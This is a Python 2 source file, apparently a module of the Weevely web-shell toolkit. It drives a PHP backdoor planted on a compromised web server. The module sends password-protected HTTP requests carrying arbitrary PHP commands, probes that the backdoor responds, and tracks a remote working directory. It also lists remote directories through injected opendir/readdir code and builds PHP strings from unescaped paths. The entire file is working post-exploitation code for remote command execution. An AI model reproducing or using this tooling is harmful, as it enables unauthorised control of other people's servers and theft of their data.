'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.http.cmdrequest import CmdRequest, NoDataException
import random, os

classname = 'Php'
    
class Php(Module):
    '''Execute single PHP commands
    :shell.php "<command>;"
    '''
    
    def __init__(self, modhandler, url, password):
        
        self.cwd_vector = None
        self.proxy = None
        
        Module.__init__(self, modhandler, url, password)
        
        proxy = self.modhandler.conf.get_option('global', 'http_proxy')
        if proxy:
            print '[+] Setting http proxy \'%s\'' % (proxy)
            self.proxy = { 'http' : proxy }
            
            

    def _probe(self):
        
        
        rand = str(random.randint( 11111, 99999 ))
        if self.run('echo %s;' % (rand)) != rand:
            raise ModuleException("shell.sh",  "PHP interpreter initialization failed")
        
    
    def run(self, cmd):

        if self.cwd_vector:
            cmd = self.cwd_vector % (cmd)
        
        request = CmdRequest( self.url, self.password, self.proxy)
        request.setPayload(cmd)
        
        try:
            resp = request.execute()
        except NoDataException, e:
            print '[-] No data returned'
        except Exception, e:
            print '[!] Error requesting data: check URL or your internet connection.'
        else:
            return resp
        

    def cwd_handler (self, path, set_new_cwd=False):
        
        response = self.run("file_exists('%s') && print(1);" % path)
        if response == '1':
            if set_new_cwd:
                self.cwd_vector = "chdir('%s') && %s" % ( path, '%s' )  
                
            return True
        
        return False
    
    def ls_handler (self, cmd):
        
        cmd_splitted = cmd.split()
        if cmd_splitted[0] == 'ls':
            if len(cmd_splitted)==1:
                path = '.'
            if len(cmd_splitted)==2:
                path = cmd_splitted[1]
        
        ls_vector = "$dir=@opendir('%s'); $a=array(); while(($f = readdir($dir))) { $a[]=$f; }; sort($a); print(join('\n', $a));"
        
        return self.run( ls_vector % (path))
    
    